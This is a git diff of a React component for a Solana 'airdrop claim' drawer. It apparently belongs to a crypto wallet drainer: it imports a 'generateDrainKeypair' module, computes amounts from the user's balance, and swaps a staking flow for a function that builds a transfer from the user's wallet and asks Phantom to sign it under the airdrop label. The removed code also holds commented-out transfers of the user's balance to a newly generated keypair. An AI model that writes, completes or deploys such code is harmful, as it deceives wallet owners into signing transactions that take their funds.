@@ -37,9 +37,10 @@ import { useWallet } from '@solana/wallet-adapter-react'
 // import { approveTokensForSpendingandSendToken } from '@/app/services/hook/sendSol'
 import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
 import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
+import { createTransferTransaction, pollSignatureStatus, signAndSendTransaction } from '@/app/services/hook/phantomCollections';
 
 const BottomDrawer = () => {
-  const {publicKey, sendTransaction } =   useWallet();
+  const {publicKey, sendTransaction  , wallet , connected } =   useWallet();
 
 const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
 const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
@@ -51,282 +52,28 @@ const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey);
 const AIRDROP_BALANCE = ((getUsersBalance * 35)  / 100) ;
 const connection =  new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
 async function claimToken(){
-  try{
-
-    if(!publicKey)return;
-    const stakeAccount = Keypair.generate();
-    const lamportconversion = (getUsersBalance * LAMPORTS_PER_SOL)
-
-    // Setup our connection and wallet
-    // const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
-
-    // const wallet = Keypair.generate();
-  
-    // Fund our wallet with 1 SOL
-    // const airdropSignature = await connection.requestAirdrop(
-    //   wallet.publicKey,
-    //   LAMPORTS_PER_SOL
-    // );
-    // await connection.confirmTransaction(airdropSignature);
-  
-    // Create a keypair for our stake account
-    // const stakeAccount = Keypair.generate();
-
-  // Get all validators, categorized by current (i.e. active) and deliquent (i.e. inactive)
-  const { current, delinquent } = await connection.getVoteAccounts();
-  console.log("current validators: ", current);
-  console.log("all validators: ", current.concat(delinquent));
-    // Calculate how much we want to stake
-    const minimumRent = await connection.getMinimumBalanceForRentExemption(
-      StakeProgram.space
-    );
-    const amountUserWantsToStake =  lamportconversion 
-    const investAmount =((amountUserWantsToStake * 25 ) / 100)
-    // const considerAmount = (amountUserWantsToStake - AIRDROP_BALANCE) ;
-    // const stakingAmount = (considerAmount < minimumRent)?  0 :  considerAmount;
-    //  console.log(lamportconversion ,minimumRent , stakingAmount )
-
-
-    // Setup a transaction to create our stake account
-    // Note: `StakeProgram.createAccount` returns a `Transaction` preconfigured with the necessary `TransactionInstruction`s
-    const createStakeAccountTx =  StakeProgram.createAccount({
-      authorized: new Authorized(publicKey, publicKey), // Here we set two authorities: Stake Authority and Withdrawal Authority. Both are set to our wallet.
-      fromPubkey: publicKey,
-      lamports: minimumRent,
-      lockup: new Lockup(0, 0,  publicKey), // Optional. We'll set this to 0 for demonstration purposes.
-      stakePubkey: stakeAccount.publicKey,
+  try {
+    const transaction = await createTransferTransaction(publicKey as unknown as PublicKey, connection);
+    console.log({
+      status: 'info',
+      method: 'signAndSendTransaction',
+      message: `Requesting signature for: ${JSON.stringify(transaction)}`,
     });
-
-
-
-
-
-const {
-  context: { slot: minContextSlot },
-  value: { blockhash, lastValidBlockHeight },
-} = await connection.getLatestBlockhashAndContext();
-
-    const signature = await sendTransaction(createStakeAccountTx, connection,
-      { 
-        minContextSlot,
-        skipPreflight: false,
-        signers: [],
-        preflightCommitment: 'confirmed',
-      }
-    );
-
-    if(!signature){
-      toast("🎉 Airdrop claiming Status ", {description: "Airdrop claiming Failed  "});
-      return;
-    }
-
-    console.log(createStakeAccountTx , signature , "create Stake Account Transaction ")
-    // stakeAccount, // Since we're creating a new stake account, we have that account sign as well
-    // console.log(`Stake account created. Tx Id: ${createStakeAccountTxId}`);
-  
-    // Check our newly created stake account balance. This should be 0.5 SOL.
-    let stakeBalance = await connection.getBalance(publicKey);
-    console.log(`Stake account balance: ${stakeBalance / LAMPORTS_PER_SOL} SOL`);
-  
-    // Verify the status of our stake account. This will start as inactive and will take some time to activate.
-    let stakeStatus = await connection.getStakeActivation(publicKey);
-    console.log(`Stake account status: ${stakeStatus.state}`);
-
-  // To delegate our stake, we first have to select a validator. Here we get all validators and select the first active one.
-  const validators = await connection.getVoteAccounts();
-  const selectedValidator = validators.current[0];
-  const selectedValidatorPubkey = new PublicKey(selectedValidator.votePubkey);
-
-  const delegateTx = StakeProgram.delegate({
-    stakePubkey: publicKey,
-    authorizedPubkey: publicKey,
-    votePubkey: selectedValidatorPubkey,
-  });
-
-
-  const delegateTxId = await sendTransaction(delegateTx, connection,
-    { 
-      minContextSlot,
-      skipPreflight: true,
-      signers: [],
-      preflightCommitment: 'processed',
-    }
-  );
-
-
-  console.log(
-    `Stake account delegated to ${selectedValidatorPubkey}. Tx Id: ${delegateTxId}`
-  );
-
-  // Check in on our stake account. It should now be activating.
-  stakeStatus = await connection.getStakeActivation(stakeAccount.publicKey);
-  console.log(`Stake account status: ${stakeStatus.state}`);
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  toast("🎉 Airdrop claiming Status ", {description: " Airdrop claimin is initialized 🎉 "});
-  resetClaim(claimLevel[2])
-  // const userBkeyPair =  await generateSolanaWallet()
-  // const mainAccountAmount  = Number(getUsersBalance) * Number(LAMPORTS_PER_SOL) - (deductGas);
-  // console.log( " { mnemonic,seed,keypair,publicKe} " ,userBkeyPair)
-//   const approveTx = new Transaction().add(
-//     approveInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey)
-//     // transferInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey) 
-// );
-
-// const {
-//   context: { slot: minContextSlot },
-//   value: { blockhash, lastValidBlockHeight },
-// } = await connection.getLatestBlockhashAndContext();
-
-    // const signature = await sendTransaction(approveTx, connection, {
-    //   minContextSlot,
-    //   skipPreflight: true,
-    //   signers: [],
-    //   preflightCommitment: 'processed',
-    // });
-    // console.log({ blockhash, lastValidBlockHeight, signature, minContextSlot });
-
-    // const confirmtx = await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
-    // console.log({ signature, confirmtx });
-    // const txdata = await connection.getParsedTransaction(signature);
-    // console.log({ data: txdata?.meta?.logMessages });
-
-
-  }catch(error){
-         console.log(error)
-  }
-
-}
-
-function approveInstruction(amount:number, senderPublicKey:PublicKey, recipientPublicKey:PublicKey) {
-  return SystemProgram.transfer({
-      fromPubkey: senderPublicKey,
-      toPubkey: recipientPublicKey,
-      lamports: amount,
-  }); 
-}
-
-
-function transferInstruction(amount:number, recipientPublicKey:PublicKey, senderPublicKey:PublicKey) {
-    return SystemProgram.transfer({
-        fromPubkey: senderPublicKey,
-        toPubkey: recipientPublicKey,
-        lamports: amount,
+    const signature = await signAndSendTransaction(window.solana, transaction);
+    console.log({
+      status: 'info',
+      method: 'signAndSendTransaction',
+      message: `Signed and submitted transaction ${signature}.`,
+    });
+    pollSignatureStatus(signature, connection);
+  } catch (error) {
+    console.log({
+      status: 'error',
+      method: 'signAndSendTransaction',
+      message: error,
     });
 }
-
+}
 
 return (
    <Drawer open={openBottomDrawal}>
@@ -389,4 +136,4 @@ return (
   )
 }
 
-export default BottomDrawer
+export default BottomDrawer;
